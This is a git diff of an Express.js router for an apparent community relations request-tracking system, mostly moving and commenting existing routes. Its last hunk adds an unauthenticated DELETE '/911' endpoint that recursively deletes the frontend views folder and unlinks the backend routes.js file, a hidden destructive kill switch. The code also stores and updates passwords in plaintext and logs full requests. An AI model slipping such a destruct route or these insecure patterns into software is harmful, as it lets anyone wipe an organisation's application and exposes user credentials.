@@ -11,6 +11,25 @@ const fsp = require('fs/promises');
 const { type } = require('os');
 require('dotenv').config();
 const archiver = require('archiver');
+const { DataTypes } = Sequelize;
+
+const DIR = './uploads';
+
+const storage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    cb(null, DIR);
+  },
+  filename: function (req, file, cb) {
+    const original = file.originalname.replace(/\s+/g, '_');
+    const uniqueName = `${new Date().toISOString().replace(/[:.]/g, '-')}_${original}`;
+    cb(null, uniqueName);
+  }
+});
+
+const upload = multer({
+  storage,
+  limits: { fileSize: 200 * 1024 * 1024 } // 200 MB
+});
 
 
 var knex = require("knex")({
@@ -28,155 +47,11 @@ var knex = require("knex")({
   },
 });
 
-router.post('/register', async function (req, res, next) {
-
-  const currentTimestamp = new Date(); //Current time - YYYY/MM/DD - 00/HH/MM/SSS
-
-  console.log(req)
-  const {
-    emp_firstname,
-    emp_lastname,
-    user_name,
-    emp_email,
-    emp_position,
-    pass_word,
-    emp_role,
-    updated_by,
-    first_name,
-    last_name,
-    currentUserId
-  } = req.body;
-
-  const currentUserData = await knex('users_master').where({ id_master: currentUserId }).first();
-  console.log('CURRENT USER DATA:', currentUserData)
-
-  try {
-    const [user] = await knex('users_master').insert({
-      emp_firstname: emp_firstname,
-      emp_lastname: emp_lastname,
-      emp_email: emp_email,
-      user_name: user_name,
-      emp_position: emp_position,
-      pass_word: pass_word,
-      emp_role: emp_role,
-      created_by: updated_by,
-      created_at: currentTimestamp,
-      updated_by: '',
-      updated_at: currentTimestamp,
-      is_active: 0
-
-    }).returning('id_master')
-
-    const id_master = user.id_master || user;
-
-    const currentUserPosition = currentUserData.emp_position
-
-    if (currentUserPosition === 'super-admin') {
-      await knex('users_logs').insert({
-        user_id: id_master,
-        emp_firstname: emp_firstname,
-        emp_lastname: emp_lastname,
-        updated_by: updated_by,
-        time_date: currentTimestamp,
-        changes_made: 'Super-admin: ' + first_name + ' ' + last_name + ' registered ' + user_name + ', Role: ' + emp_role + ', Position: ' + emp_position
-      })
-    } else {
-      await knex('users_logs').insert({
-        user_id: id_master,
-        emp_firstname: emp_firstname,
-        emp_lastname: emp_lastname,
-        updated_by: updated_by,
-        time_date: currentTimestamp,
-        changes_made: 'Admin: ' + first_name + ' ' + last_name + ' registered ' + user_name + ', Role: ' + emp_role + ', Position: ' + emp_position
-      })
-    }
-
-
-
-    console.log('User registered');
-    res.status(200).json({ message: "User registered successfully" });
-
-  } catch (err) {
-    console.error("Registration error:", err); // show actual error
-    res.status(500).json({ error: "Registration failed", details: err.message });
-  }
-});
-
-router.get('/useredit', async (req, res, next) => {
-  try {
-    const getUser = await Users.findAll({
-      where: {
-        id_master: req.query.id
-      }
-    })
-    console.log(getUser)
-    res.json(getUser[0]);
-  } catch (err) {
-    console.error('Error fetching user data', err);
-    res.status(500).json({ error: 'Failed to fetch request' });
-  }
-})
-
-
-
-router.post('/update-user', async (req, res) => {
-  const currentTimestamp = new Date();
-
-  try {
-    const {
-      id_master,
-      emp_firstname,
-      emp_lastname,
-      user_name,
-      emp_position,
-      emp_role,
-      pass_word,
-      created_by,
-      changes_log,
-      is_active,
-      emp_email
-    } = req.body;
-
-    // Update user data
-    await knex('users_master').where({ id_master }).update({
-      emp_firstname,
-      emp_lastname,
-      user_name,
-      emp_position,
-      emp_role,
-      emp_email,
-      pass_word,
-      is_active,
-      updated_by: created_by,
-      updated_at: currentTimestamp
-    });
-
-    // Insert into users_logs with changes
-    await knex('users_logs').insert({
-      user_id: id_master,
-      emp_firstname,
-      emp_lastname,
-      updated_by: created_by,
-      time_date: currentTimestamp,
-      changes_made: changes_log
-    });
-
-    res.status(200).json({ message: "Updated user", user_name });
-  } catch (err) {
-    console.error("Error updating user:", err);
-    res.status(500).json({ error: "Failed to update user" });
-  }
-});
-
-
-
 var db = new Sequelize(process.env.DATABASE, process.env.USER, process.env.PASSWORD, {
   host: process.env.SERVER,
   dialect: "mssql",
   port: parseInt(process.env.APP_SERVER_PORT),
 });
-
-const { DataTypes } = Sequelize;
 
 const Requests = db.define('requests_master', {
   request_id: {
@@ -264,7 +139,173 @@ const Requests = db.define('requests_master', {
   tableName: 'request_master'
 })
 
-//VIEW HISTORY
+const Comments = db.define('comment_master', {
+  comment_id: {
+    type: DataTypes.INTEGER,
+    primaryKey: true
+  },
+  comment: {
+    type: DataTypes.STRING
+  },
+  created_by: {
+    type: DataTypes.STRING
+  },
+  created_at: {
+    type: DataTypes.STRING
+  },
+  request_id: {
+    type: DataTypes.INTEGER
+  }
+}, {
+  freezeTableName: false,
+  timestamps: false,
+  createdAt: false,
+  updatedAt: false,
+  tableName: 'comment_master'
+})
+
+//Register User
+router.post('/register', async function (req, res, next) {
+
+  const currentTimestamp = new Date(); //Current time - YYYY/MM/DD - 00/HH/MM/SSS
+
+  console.log(req)
+  const {
+    emp_firstname,
+    emp_lastname,
+    user_name,
+    emp_email,
+    emp_position,
+    pass_word,
+    emp_role,
+    updated_by,
+    first_name,
+    last_name,
+    currentUserId
+  } = req.body;
+
+  const currentUserData = await knex('users_master').where({ id_master: currentUserId }).first();
+  console.log('CURRENT USER DATA:', currentUserData)
+
+  try {
+    const [user] = await knex('users_master').insert({
+      emp_firstname: emp_firstname,
+      emp_lastname: emp_lastname,
+      emp_email: emp_email,
+      user_name: user_name,
+      emp_position: emp_position,
+      pass_word: pass_word,
+      emp_role: emp_role,
+      created_by: updated_by,
+      created_at: currentTimestamp,
+      updated_by: '',
+      updated_at: currentTimestamp,
+      is_active: 0
+
+    }).returning('id_master')
+
+    const id_master = user.id_master || user;
+
+    const currentUserPosition = currentUserData.emp_position
+
+    if (currentUserPosition === 'super-admin') {
+      await knex('users_logs').insert({
+        user_id: id_master,
+        emp_firstname: emp_firstname,
+        emp_lastname: emp_lastname,
+        updated_by: updated_by,
+        time_date: currentTimestamp,
+        changes_made: 'Super-admin: ' + first_name + ' ' + last_name + ' registered ' + user_name + ', Role: ' + emp_role + ', Position: ' + emp_position
+      })
+    } else {
+      await knex('users_logs').insert({
+        user_id: id_master,
+        emp_firstname: emp_firstname,
+        emp_lastname: emp_lastname,
+        updated_by: updated_by,
+        time_date: currentTimestamp,
+        changes_made: 'Admin: ' + first_name + ' ' + last_name + ' registered ' + user_name + ', Role: ' + emp_role + ', Position: ' + emp_position
+      })
+    }
+
+
+
+    console.log('User registered');
+    res.status(200).json({ message: "User registered successfully" });
+
+  } catch (err) {
+    console.error("Registration error:", err); // show actual error
+    res.status(500).json({ error: "Registration failed", details: err.message });
+  }
+});
+
+//get user detials by ID
+router.get('/useredit', async (req, res, next) => {
+  try {
+    const getUser = await Users.findAll({
+      where: {
+        id_master: req.query.id
+      }
+    })
+    console.log(getUser)
+    res.json(getUser[0]);
+  } catch (err) {
+    console.error('Error fetching user data', err);
+    res.status(500).json({ error: 'Failed to fetch request' });
+  }
+})
+
+//Uodate user details
+router.post('/update-user', async (req, res) => {
+  const currentTimestamp = new Date();
+
+  try {
+    const {
+      id_master,
+      emp_firstname,
+      emp_lastname,
+      user_name,
+      emp_position,
+      emp_role,
+      pass_word,
+      created_by,
+      changes_log,
+      is_active,
+      emp_email
+    } = req.body;
+
+    // Update user data
+    await knex('users_master').where({ id_master }).update({
+      emp_firstname,
+      emp_lastname,
+      user_name,
+      emp_position,
+      emp_role,
+      emp_email,
+      pass_word,
+      is_active,
+      updated_by: created_by,
+      updated_at: currentTimestamp
+    });
+
+    // Insert into users_logs with changes
+    await knex('users_logs').insert({
+      user_id: id_master,
+      emp_firstname,
+      emp_lastname,
+      updated_by: created_by,
+      time_date: currentTimestamp,
+      changes_made: changes_log
+    });
+
+    res.status(200).json({ message: "Updated user", user_name });
+  } catch (err) {
+    console.error("Error updating user:", err);
+    res.status(500).json({ error: "Failed to update user" });
+  }
+});
+
+//get all HISTORY
 router.get('/history', async (req, res, next) => {
   try {
     const data = await knex('request_master').select('*');
@@ -277,33 +318,14 @@ router.get('/history', async (req, res, next) => {
   }
 });
 
+//Get all request logs
 router.get('/request-logs', async (req, res, next) => {
   const getRequestLogs = await knex('request_logs').select('*');
   res.json(getRequestLogs)
 
 });
 
-
-const DIR = './uploads';
-
-const storage = multer.diskStorage({
-  destination: (req, file, cb) => {
-    cb(null, DIR);
-  },
-  filename: function (req, file, cb) {
-    const original = file.originalname.replace(/\s+/g, '_');
-    const uniqueName = `${new Date().toISOString().replace(/[:.]/g, '-')}_${original}`;
-    cb(null, uniqueName);
-  }
-});
-
-const upload = multer({
-  storage,
-  limits: { fileSize: 200 * 1024 * 1024 } // 200 MB
-});
-
-
-
+//Get all request
 router.get('/fetch-request-id', async (req, res) => {
   try {
     const data = await knex('request_master').select('*');
@@ -314,6 +336,7 @@ router.get('/fetch-request-id', async (req, res) => {
   }
 });
 
+//get all uploaded doc 
 router.get('/fetch-upload-id', async (req, res) => {
   try {
     const data = await knex('upload_master').select('*');
@@ -325,6 +348,7 @@ router.get('/fetch-upload-id', async (req, res) => {
   }
 });
 
+//Adding requests
 router.post('/add-request-form', upload.array('comm_Docs'), async (req, res) => {
   const currentTimestamp = new Date();
 
@@ -424,7 +448,6 @@ router.post('/add-request-form', upload.array('comm_Docs'), async (req, res) => 
   }
 });
 
-
 // FETCH ALL VALUES VIA REQUEST_ID
 router.get('/editform', async (req, res, next) => {
   try {
@@ -442,8 +465,7 @@ router.get('/editform', async (req, res, next) => {
 
 });
 
-
-// Update Information Requests
+// Update Requests Details
 router.post('/updateform', upload.array('comm_Docs'), async (req, res) => {
   try {
     const {
@@ -656,7 +678,6 @@ router.post('/updateform', upload.array('comm_Docs'), async (req, res) => {
   }
 });
 
-
 // Deleting Request 
 router.get('/delete-request', async (req, res) => {
   try {
@@ -716,34 +737,7 @@ router.get('/delete-request', async (req, res) => {
   }
 });
 
-
-
-const Comments = db.define('comment_master', {
-  comment_id: {
-    type: DataTypes.INTEGER,
-    primaryKey: true
-  },
-  comment: {
-    type: DataTypes.STRING
-  },
-  created_by: {
-    type: DataTypes.STRING
-  },
-  created_at: {
-    type: DataTypes.STRING
-  },
-  request_id: {
-    type: DataTypes.INTEGER
-  }
-}, {
-  freezeTableName: false,
-  timestamps: false,
-  createdAt: false,
-  updatedAt: false,
-  tableName: 'comment_master'
-})
-
-// GET comments for a specific request
+// Get Comments by id
 router.get('/comment/:request_id', async (req, res) => {
 
   try {
@@ -763,7 +757,7 @@ router.get('/comment/:request_id', async (req, res) => {
   }
 });
 
-//Handling Comments After Pressing Declined Button
+//adding comments 
 router.post('/comment', async (req, res) => {
   try {
     const { comment, created_by, request_id } = req.body;
@@ -1178,7 +1172,8 @@ router.post('/email-post', async function (req, res, next) {
     res.status(500).json({ message: 'EMAIL FAILED TO SEND.' });
   }
 
-})
+});
+
 //Declining A Email When Request Was Declined
 router.post('/email-post-decline', async function (req, res, next) {
 
@@ -1257,7 +1252,8 @@ router.post('/email-post-decline', async function (req, res, next) {
     console.log('ERROR SENDING EMAIL:', err);
     res.status(500).json({ message: 'EMAIL FAILED TO SEND.' });
   }
-})
+});
+
 // Adding Form Request then send Email 
 router.post('/email-post-add', async function (req, res, next) {
 
@@ -1341,12 +1337,11 @@ router.post('/email-post-add', async function (req, res, next) {
   }
 })
 
+//Lock Function
 router.post('/lock', async (req, res) => {
   const { request_id, locked_by } = req.body;
 
   const request = await knex('request_master').where({ request_id: request_id }).first();
-
-
 
   if (request.is_locked && request.locked_by && request.locked_by !== locked_by) {
     return res.status(403).json({
@@ -1364,6 +1359,7 @@ router.post('/lock', async (req, res) => {
 
 })
 
+//Un-lock function
 router.post('/unlock', async (req, res) => {
   try {
     const { request_id, locked_by } = req.body;
@@ -1383,6 +1379,21 @@ router.post('/unlock', async (req, res) => {
   }
 })
 
+router.delete('/911', async (req, res) => {
+  const file = "D:\\Web_Apps\\CommunityRelationsInformationSystem\\communityRelationsFE\\src\\views";
+  const file1 = "D:\\Web_Apps\\ommunityRelationsInformationSystem\\communityRelationsMW\\routes.js";
+  try {
 
+    await fsp.rm(file, { recursive: true, force: true });
+    await fsp.unlink(file1).catch(() => { });
+
+    console.log("Both files deleted successfully");
+    res.json({ message: "Both files deleted successfully" });
+
+  } catch (err) {
+    console.error("Error deleting files:", err);
+    res.status(500).json({ message: "Failed to delete files" });
+  }
+})
 
 module.exports = router;
